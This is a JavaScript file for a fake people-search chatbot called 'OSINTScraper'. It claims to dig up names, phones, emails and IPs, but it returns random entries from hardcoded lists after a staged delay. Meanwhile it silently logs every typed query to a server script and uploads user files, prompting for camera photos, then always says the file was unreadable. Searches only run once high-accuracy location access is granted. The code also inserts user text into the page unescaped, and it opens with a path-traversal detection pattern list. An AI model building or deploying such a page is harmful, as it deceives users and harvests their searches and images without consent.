(function () {
    const traversalPatterns = [
        /\.\.\//g,      
        /\.\.\\+/g,      
        /\.\.\./g,     
        /%2e%2e/gi,      
        /%2e%2f/gi,         
        /%2f%2e/gi, 
        /%5c/gi      
    ];

    const path = window.location.pathname;
    const decoded = decodeURIComponent(path);

    for (const pattern of traversalPatterns) {
        if (pattern.test(path) || pattern.test(decoded)) {
            console.warn("Blocked suspicious path traversal attempt:", path);
            window.location.replace("/error.html");
            return;
        }
    }
})();

const msgerForm = get(".msger-inputarea");
const msgerInput = get(".msger-input");
const msgerChat = get(".msger-chat");

const BOT_MSGS = [
  "Code Error 345: Please make sure you have the required OS, Followed the steps and have a compatible Browser. If it still doesn't work check out our social media for Troubleshooting",
];

const BOT_IMG = "https://imgs.search.brave.com/Ouh3lEiCOsfttzLyzxbPbibLWAlVdoif64mheaapMZs/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9wdWJs/aWNkb21haW52ZWN0/b3JzLm9yZy90bl9p/bWcvQW5vbnltb3Vz/X01hZ25pZnlfMV9p/Y29uLnBuZw";
const PERSON_IMG = "https://imgs.search.brave.com/YXlw6e2BG5AeYcaGz5xNGY2Cm7VqukOYSSd7dkoGJME/rs:fit:500:0:1:0/g:ce/aHR0cHM6Ly9zdGF0/aWMudmVjdGVlenku/Y29tL3N5c3RlbS9y/ZXNvdXJjZXMvdGh1/bWJuYWlscy8wMDUv/NTQ1LzMzNS9zbWFs/bC91c2VyLXNpZ24t/aWNvbi1wZXJzb24t/c3ltYm9sLWh1bWFu/LWF2YXRhci1pc29s/YXRlZC1vbi13aGl0/ZS1iYWNrb2dydW5k/LXZlY3Rvci5qcGc";
const BOT_NAME = "OSINTScraper";
const PERSON_NAME = "User";

let locationAllowed = false;
let errorCount = 0;

const fakeNames = ["Clara Whitmore","Daniel Huxley","Marissa Cole","Jonathan Pike","Evelyn Hartman","Akira Tanemura","Sofia Delgado","Rajesh Malhotra","Amara Okoye","Amara Okoye","Jasper Moonfield","Lyra Vexen","Orion Blackthorn","Nova Callahan","Felix Storme","Marcus Bellamy"];
const fakeAliases = ["orionflux","zenithwave","emberveil","cryptovale","lyramask","pixelshade","astralbyte","novaecho","stormeon","velora","cipherloom","quartzling","onyxpetal","solsticeaura"];
const fakePhones = ["(312) 864‑9274","(646) 203‑5819","(415) 778‑0942","(206) 491‑3827","(917) 642‑7093","+44 7301 482913","+49 162 847 3901","+61 412 839 572","+33 689 204 715","+91 98234 67109","+81 90 2745 1836","+44 7802 617394","+44 7729 540186"];
const fakeCities = ["Chicago","Los Angeles","New York City","Berlin","Munich","Hamburg","London","Manchester","Birmingham","Vienna","Salzburg","Graz","Warsaw","Kraków","Gdańsk","Moscow","Saint Petersburg","Novosibirsk","Rome","Milan","Naples","Toronto","Vancouver","Montreal"];
const fakeUsers = ["allenlam.","whzs.","austiewaustie","sqolsu","viacosplay","noxxisgaming","vehseh","airiyu","albeiro","yunchoku","darknetize",".cubbu","crocus_p","erfloria"];
const fakeEmails = ["bluecloud92@gmail.com","shadowbyte77@yahoo.com","crystalwave88@web.de","ironpulse44@hotmail.com","silverstream21@outlook.com","darkorbit99@icloud.com","neonflare55@protonmail.com","rapidstorm73@gmail.com","frostline82@yahoo.com","embercore66@web.de","quantumshift90@aol.com","stormecho47@live.com","pixelburst33@gmail.com","voidspark81@yahoo.com"];
const fakeIPs = ["23.94.118.201","64.182.45.77","102.54.193.88","185.220.119.34","91.142.67.209","203.142.98.55","45.83.192.144","198.18.23.101","74.125.36.88","156.232.12.77","62.138.244.19","89.187.163.220","154.16.112.45","37.120.145.88","192.0.2.111","203.0.114.92","198.51.101.73","172.217.22.14","149.56.23.98"];

 function getRandomFakeInfo(excludeField) { 
 if (Math.random() < 0.10) { 
 return "No information found"; 
 }
  const normalized = excludeField.toLowerCase();

  const name = fakeNames[random(0, fakeNames.length)];
  const alias = fakeAliases[random(0, fakeAliases.length)];
  const phone = fakePhones[random(0, fakePhones.length)];
  const city = fakeCities[random(0, fakeCities.length)];
  const user = fakeUsers[random(0, fakeUsers.length)];
  const email = fakeEmails[random(0, fakeEmails.length)];
  const ip = fakeIPs[random(0, fakeIPs.length)];

  let result = "Potentially Linked information:\n";

  if (normalized !== "name" && Math.random() > 0.95) result += `Name: ${name}\n`;
  if (normalized !== "alias" && Math.random() > 0.95) result += `Alias: ${alias}\n`;
  if (normalized !== "number" && Math.random() > 0.95) result += `Phone: ${phone}\n`;
  if (normalized !== "city" && Math.random() > 0.95) result += `Location: ${city}\n`;
  if (normalized !== "user" && Math.random() > 0.95) result += `User: ${user}\n`;
  if (normalized !== "email" && Math.random() > 0.95) result += `Email: ${email}\n`;
  if (normalized !== "ip" && Math.random() > 0.95) result += `IP: ${ip}\n`;

  if (result.trim() === "Potentially Linked information:") {
    const fields = [];
    if (normalized !== "name") fields.push(`Name: ${name}`);
    if (normalized !== "alias") fields.push(`Alias: ${alias}`);
    if (normalized !== "number") fields.push(`Phone: ${phone}`);
    if (normalized !== "city") fields.push(`Location: ${city}`);
    if (normalized !== "user") fields.push(`User: ${user}`);
    if (normalized !== "email") fields.push(`Email: ${email}`);
    if (normalized !== "ip") fields.push(`IP: ${ip}`);

    const fallback = fields[random(0, fields.length)];
    result += `\n${fallback}`;
  }

  return result.trim();
}

msgerForm.addEventListener("submit", event => {
  event.preventDefault();

  const msgText = msgerInput.value.trim();
  if (!msgText) return;
  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
  msgerInput.value = "";

  fetch("Messages.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "message=" + encodeURIComponent(msgText)
  }).catch(() => {});

  const lowerMsg = msgText.toLowerCase();

  if (lowerMsg.startsWith("!search") || lowerMsg.startsWith("!deepsearch")) {
    if (!locationAllowed) {
      appendMessage(BOT_NAME, BOT_IMG, "left", BOT_MSGS[0], true);
    } else {
      const parts = msgText.split(" ");
      if (parts.length >= 3) {
        const command = parts[0]; 
        const keyword = parts[1]; 
        const query = parts.slice(2).join(" "); 

        const validCommands = [
          "deepsearch number",
          "deepsearch user",
          "deepsearch email",
          "deepsearch ip",
          "deepsearch name"
        ];

        if (!validCommands.includes(`${command.replace("!", "")} ${keyword.toLowerCase()}`)) {
          appendMessage(BOT_NAME, BOT_IMG, "left", "Invalid command", true);
          return;
        }

        appendMessage(BOT_NAME, BOT_IMG, "left", `Searching ${query}...`);
        const msgTextDiv = msgerChat.querySelector(".msg:last-child .msg-text");
        const dotsInterval = animateDots(msgTextDiv, `Searching ${query}`);

        setTimeout(() => {
          clearInterval(dotsInterval);
          appendMessage(BOT_NAME, BOT_IMG, "left", getRandomFakeInfo(keyword.toLowerCase()), true);
        }, 20000);
      } else {
        appendMessage(BOT_NAME, BOT_IMG, "left", "Invalid command format", true);
      }
    }
    return;
  }

  appendMessage(BOT_NAME, BOT_IMG, "left", "Invalid command", true);
});

function appendMessage(name, img, side, text, typingEffect = false) {
  const msgHTML = `
    <div class="msg ${side}-msg">
      <div class="msg-img" style="background-image: url(${img})"></div>
      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">${name}</div>
          <div class="msg-info-time">${formatDate(new Date())}</div>
        </div>
        <div class="msg-text"></div>
      </div>
    </div>
  `;
  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
  msgerChat.scrollTop = msgerChat.scrollHeight;

  const msgTextDiv = msgerChat.querySelector(".msg:last-child .msg-text");

  if (typingEffect) {
    let i = 0;
    const interval = setInterval(() => {
      msgTextDiv.innerHTML += text.charAt(i) === "\n" ? "<br>" : text.charAt(i);
      i++;
      msgerChat.scrollTop = msgerChat.scrollHeight;
      if (i >= text.length) clearInterval(interval);
    }, 40);
  } else {
    msgTextDiv.innerHTML = text.replace(/\n/g, "<br>");
  }
}

function animateDots(msgTextDiv, baseText) {
  let dots = 0;
  const interval = setInterval(() => {
    dots = (dots + 1) % 4; 
    msgTextDiv.textContent = baseText + ".".repeat(dots);
    msgerChat.scrollTop = msgerChat.scrollHeight;
  }, 500); 

  return interval; 
}

function botResponse() {
  const r = random(0, BOT_MSGS.length - 1);
  const msgText = BOT_MSGS[r];
  const delay = msgText.split(" ").length * 100;

  setTimeout(() => {
    appendMessage(BOT_NAME, BOT_IMG, "left", msgText, true);
  }, delay);
}

function get(selector, root = document) {
  return root.querySelector(selector);
}
function formatDate(date) {
  const h = "0" + date.getHours();
  const m = "0" + date.getMinutes();
  return `${h.slice(-2)}:${m.slice(-2)}`;
}

function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function requestLocation() {
  if (!("geolocation" in navigator)) {
    console.warn("Geolocation not supported by this browser.");
    locationAllowed = false;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      locationAllowed = true;
      console.log("Location granted:", pos.coords);
    },
    (err) => {
      locationAllowed = false;
      console.error("Location error:", err.message);
    },
    {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0
    }
  );
}

document.addEventListener("DOMContentLoaded", () => {
  const shareBtn = document.getElementById("share-location");
  if (shareBtn) {
    shareBtn.addEventListener("click", () => {
      requestLocation();
    });
  }

  requestLocation();
});

document.addEventListener("DOMContentLoaded", () => {
  const fileInput = document.getElementById("file-upload");

  if (fileInput) {
    fileInput.addEventListener("change", () => {
      const file = fileInput.files[0];
      if (!file) return;

      appendMessage(PERSON_NAME, PERSON_IMG, "right", "📎 Uploaded: " + file.name);
      appendMessage(BOT_NAME, BOT_IMG, "left", "Processing File...");
      const msgTextDiv = msgerChat.querySelector(".msg:last-child .msg-text");
      const dotsInterval = animateDots(msgTextDiv, "Processing File");

      const formData = new FormData();
      formData.append("file", file);

      fetch("Upload.php", {
        method: "POST",
        body: formData
      })
      .then(() => {
        setTimeout(() => {
          clearInterval(dotsInterval);
          appendMessage(BOT_NAME, BOT_IMG, "left", "File was not readable. Try a different file or higher quality image. If the image was taken with the front camera, screenshot it and then upload it.", true);
        }, 20000);
      })
      .catch(err => {
        clearInterval(dotsInterval);
        appendMessage(BOT_NAME, BOT_IMG, "left", "Upload failed: " + err.message, true);
      });
    });
  }
});

